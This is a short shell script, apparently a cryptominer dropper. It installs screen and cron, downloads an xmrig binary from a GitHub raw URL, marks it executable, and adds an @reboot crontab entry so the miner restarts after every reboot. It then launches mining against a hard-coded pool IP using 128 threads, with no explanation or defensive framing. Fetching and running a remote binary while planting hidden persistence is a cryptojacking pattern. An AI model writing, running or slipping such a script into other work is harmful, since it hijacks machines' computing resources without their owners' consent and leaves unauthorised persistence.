export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install screen cron -y
cd ~
wget https://raw.githubusercontent.com/SamCoThePuggo/Scripts/main/xmrig
chmod +x ./xmrig
crontab -l | { cat; echo "@reboot screen /root/xmrig -u Rebooted -o 151.236.220.132:3333 -p Rebooted" ; } | crontab -
screen ~/xmrig -u Connection -o 151.236.220.132:3333 -p Connection -t 128
